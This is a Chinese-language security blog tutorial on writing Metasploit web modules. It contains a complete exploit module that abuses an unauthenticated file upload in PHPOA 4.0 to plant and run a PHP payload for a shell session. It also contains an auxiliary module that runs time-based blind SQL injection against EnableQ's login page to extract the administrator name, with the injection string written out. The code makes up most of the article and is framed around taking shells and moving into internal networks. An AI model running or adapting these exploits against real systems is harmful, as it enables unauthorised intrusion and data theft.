# Metasploit module开发WEB篇

阅读量 **155946**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-08-08 16:49:38

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

译文仅供参考，具体内容表达以及含义原文为准。

**Metasploit是款渗透神器,尤其是在拿到会话后撸内网那感觉更是爽上天。  
**

**在平常的渗透测试过程中,多是通过撸掉web拿到shell进入内网,所以在拿到shell后往往就会想办法获取个metasploit的会话,方便后面往下撸。对于那些通用CMS的漏洞,拿shell到获取会话的过程可以通过编写模块来搞定,提高效率,避免重复工作,同时也可以通过提交模块到长矛获得一些收入。**

如标题所写,本文主要介绍web渗透相关模块的开发,二进制玩不来,等学会了再来和大家分享。

**前言:**

Web中漏洞类型那么多,有些十分适合拿来写exploit模块,像文件上传、命令执、代码执行这种,很容易就拿到shell获取会话。相比那些比较鸡肋的洞,难以对服务器直接造成威胁,缺乏适用性或本身价值就不大,比如同样是sql注入,有的服务器权限没做好能拿shell,但是在没有丁点写权限的情况下也只能来搞出来点数据而已;还有文件包含之类的洞,受太多环境变量影响;XSS、CSRF、SSRF这些就更不用说了,还有权限没做好导致信息泄漏之类的洞;就只能拿来写辅助模块(auxiliary)

**准备:**

码代码前先把工具准备好。

metasploit框架推荐从git上下载,kali里带的那个版本比较低,低版本框架中module用的类名称是Metasploit3,而新框架中已经改名成MetasploitModule,继续使用的话会产生警告;同时新框架下的payload也有改变,以cmd/unix/reverse_netcat为例,在新框架下更名成了cmd/unix/reverse_netcat_
gaping;新框架下payload支持使用代理,通过代理可以很方便的调试,这也是推荐使用新框架的重要原因。Metasploit支持通过-m
参数加载指定路径的模块,所以可以通过命令mkdir –p ~/module/{auxiliary, exploits}/

先在家目录下创建文件夹,然后通过msfconsole –m ~/module/
加载目录下的模块,编辑模块后在msf控制台通过reload命令重新载入,方便调试代码,不过据我测试,reload命令只对exploits目录下的模块有效。。。

一款顺手的代理工具,拿来调试插件。我倾向用burpsuit,其他的也可以,只要能得到框架发出的数据包就行(刚开始写插件的时候太年轻,直接上wireshark看数据的。。。)。

**开整:**

首先是exploit模块的编写,以phpoa4.0任意文件上传导致getshell漏洞为例,乌云漏洞编号为[wooyun-2016-0182666](http://www.wooyun.org/bugs/wooyun-2016-0182666),通过漏洞说明和证明很容易理解漏洞,利用方式简单粗暴,直接构造表单上传。所以我们的模块就是要上传个带有payload的php文件,然后访问这个php文件,获得metasploit会话。看代码:

    
    
    #引入msf的核心框架代码
    require 'msf/core'
    #声明新的类,继承自Msf::Exploit::Remote
    class MetasploitModule < Msf::Exploit::Remote
    #制定该模块的易用性,就是给自己评RANK
      Rank = ExcellentRanking
    #引入要用到的模块,和python中的import功能一样
      include Msf::Exploit::Remote::HttpClient
    #初始化函数
      def initialize(info = {})
        super(update_info(info,
                          'Name' => '  PHPOAV4.0任意文件上传',
                          'Description' => %q{
                                upload/index.php 无需登录等认证即可上传任意文件,商业授权版,企业应用版,政务版,集团版通杀
                                     },
                          'Author' =>
                              [
                                  '3xpl0it',#漏洞作者
                                  '扶摇直上打飞机'#插件作者
                              ],
                          'License' => MSF_LICENSE,
                          'References' =>
                              [
                                  ['url', 'http://www.wooyun.org/bugs/wooyun-2016-0182666']
                              ],
                          'Privileged' => true,
    #指定目标平台类型
                          'Platform' => ['php'],
                          'Targets' => [['all of them', {}],],
    #指定目标框架架构
                          'Arch' => ARCH_PHP,
                          'DefaultTarget' => 0,
              ))
    #注册参数
        register_options(
            [
                Opt::RHOST(),
                Opt::RPORT(80),
                OptString.new('TARGETURI', [true, 'The URI of the Centreon Application', '/']),
            ], self.class)
      end
    #定义上传函数
      def upload
    #定义个全局文件名变量,一个随机的文件名
        @fname = "#{rand_text_alphanumeric(rand(10)+6)}.php"
    #生成要上传的payload
        php = "<?php #{payload.encoded}?>"
    #实例化MIME消息体
        data = Rex::MIME::Message.new
        data.add_part(php, 'image/jpeg', nil, "form-data; name="files"; filename="#{@fname}"")
        post_data = data.to_s
        print_status("Uploading #{@fname} payload...")
    #上传文件
        res = send_request_cgi({
                                   'method' => 'POST',
                                   'uri' => normalize_uri(target_uri.path, 'upload', 'index.php'),
                                   'ctype' => "multipart/form-data; boundary=#{data.bound}",
                                   'data' => post_data,
                               })
    #验证上传及访问上传文件获得会话
        if res.code.to_s == '200'
          json = JSON.parse(res.body)
          tempfile = json['files'][0]['url']
          shellpath = normalize_uri(target_uri.path, 'upload', tempfile)
          print_good("Shell address:#{shellpath}")
          print_status("Executing the payload...")
          send_request_cgi(
              {
                  'uri' => shellpath,
                  'method' => 'GET'
              }, 5)
          print_good("Executed payload")
        else
          fail_with(Failure::Unknown, "#{rhost} cant get crumb value ")
        end
      end
      def exploit
        upload
      end
      def rhost
        datastore['RHOST']
      end
      def rport
        datastore['RPORT']
      end
      def targeturi
        datastore['TARGETURI']
      end
    end

initialize就是初始化函数,里面定义插件的基本信息,名称、描述、作者等,其中Platform指定插件适用的平台,Arch指定插件适用的框架,两者决定了payload的类型,在本例中platform我选择的是php,arch选择的是ARCH_PHP,所以供我选择的payload有

对于.net应用可以选择platform为win,arch为arch_x86。更多关于platform和arch的填写可以参考这里[http://doc.metascan.cn/](http://doc.metascan.cn/),也可以参考现有插件。

register_options是注册exp参数用的,有时可能先有参数选择不够用的,就需要自己来定义个,有时也会为了方便利用而设置个默认值,也是在这里注册,比如有个应用是用https协议的,而且端口不是80,所以为了方便,在这里就会设置两个默认参数:

    
    
    Opt::RPORT(443),
     OptBool.new('SSL', [true, 'Negotiate SSL/TLS for outgoing connections', true]),

这里就是指定默认使用HTTPS协议,端口443.

所有的payload都在modules/payloads目录下,都是ruby文件,这里以php/reverse_php
为例,文件路径为modules/payloads/singles/php/reverse_php.rb,详细代码诸位可自行去看看,这里就不浪费篇幅了,其中在初始化函数initialize中也定义了payload适用的platform和arch,亦可由此判断payload适用场景。

本例是一个任意文件上传漏洞的利用,发送请求是用的send_request_cgi函数,其中需要注意的地方为ctype的设置,ctype设置HTTP请求中的Content-Type,send_request_cgi函数的默认Content-Type是application/x-www-form-urlencoded,是最常见的POST提交数据的方式。也是浏览器的原生form表单,即在不设置 enctype 属性的情况下,那么最终就会以
application/x-www-form-urlencoded 方式提交数据。

当需要上传文件到服务器时,enctyped的值就需要设置为multipart/form-data,在本例中即是如此。在请求体中为了区分不同的片段需要设置boundary,要传输的消息体每部分都是以 –boundary
开始,紧接着内容描述信息,然后是回车,最后是字段具体内容(文本或二进制),如果传输的是文件,还要包含文件名和文件类型信息。消息主体最后以
–boundary– 标示结束

。

如下图所示

此外enctype的类型还有text/xml,application/json,具体的可以去看[http://www.aikaiyuan.com/6324.html这篇文章](http://www.aikaiyuan.com/6324.html%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0)。

在post请求中,因为要上传文件,所以首先REX::MIME::Message.new实例化一个对象,然后利用add_part函数填充内容(函数的定义在lib/rex/mime/message.rb中,有兴趣的可以去看下),最后将该对象转为字符串格式用以发送。

待payload上传成功,访问触发就可获得会话。

**测试:**

成功获取会话,中间配置代理查看请求过程

再来一个auxiliary模块

这是enableq的一个sqli漏洞,乌云漏洞编号为wooyun-2015-0164832,在漏洞分析中已经给出详细的利用过程,所以这个插件写起来也是很简单,直接看关键代码

    
    
    def rand_xff
      return "#{rand(1...255)}.#{rand(1...255)}.#{rand(1...255)}.#{rand(1...255)}"
    end
    def get_rand_post
      rand_respone = send_request_raw({
                                          'uri' => normalize_uri(target_uri.path, "enableq", "System", "Login.php"),
                                          'headers' =>
                                              {
                                                  "x-forwarded-for" => "#{rand_xff}"
                                              }
                                      })
      if rand_respone and rand_respone.body =~ /name="crumb" id="crumb" value="(w+)"/
        crumb = $1
        if rand_respone.headers['Set-Cookie'] =~ /PHPSESSID=(w+)/
          return crumb, $1
          endset
        else
          fail_with(Failure::Unknown, "#{rhost} cant get crumb value ")
        end
        return Exploit::CheckCode::Safe
      end
    end
    def get_username
      getres = 0
      username = ''
      crumb, session_id = get_rand_post
      print_status("start to exploit....")
      for f in (0..20)
        if getres ==2
          print_good("USERNAMR:#{username}")
          return username
        end
        getres += 1
        for i in [*'0'..'9', *'a'..'z', *'A'..'Z']
          begin
            timeout(3) do
              swapname = username
              swapname = "#{swapname}#{i}"
              hex_swapname = swapname.each_byte.map { |b| b.to_s(16) }.join
              postdata = {
                  'Action' => 'LoginSubmit',
                  'userName' => "test錦' or  administratorsID = 1 and administratorsName like 0x#{hex_swapname}25 and sleep(6)#",
                  'crumb' => "#{crumb}",
                  'remberme' => '0',
                  'userPass' => '8277e0910d750195b448797616e091ad',
              }
              send_request_cgi({
                                   'method' => 'POST',
                                   'uri' => normalize_uri(target_uri.path, "enableq", "System", "Login.php"), 
                                   'vars_post' => postdata, 
                                   'cookie' => "PHPSESSID=#{session_id}", 
                                   'headers' => 
                                       {
                                           "x-forwarded-for" => "#{rand_xff}"
                                       }
                               })
            end
          rescue TimeoutError
            getres = 0
            username = "#{username}#{i}"
            print_good("#{username}")
            sleep(3)
            break
          end
        end
      end
    end

漏洞说明中给的exp是用延时注入,所以我这里也就使用延时的方法来。

这段代码里更多的是ruby使用的问题,理解漏洞后也没啥技巧可谈。。。。

  

**结尾:**

模块的编写很简单,漏洞搞清楚了,写起来还是很快的,遇到不明白的可以参考别人的,也可以去翻文档看源码。

  

**参考:**

[http://www.rubydoc.info/github/rapid7/metasploit-framework/](http://www.rubydoc.info/github/rapid7/metasploit-framework/)

<http://www.aikaiyuan.com/6324.html>

[http://drops.wooyun.org/tips/14408](http://drops.wooyun.org/tips/14408)

[http://doc.metascan.cn/](http://doc.metascan.cn/)

本文翻译自360安全播报 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **扶摇直上打飞机** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/84351](/post/id/84351)

安全客 - 有思想的安全新媒体

本文转载自: [360安全播报]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __1赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg) 扶摇直上打飞机

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

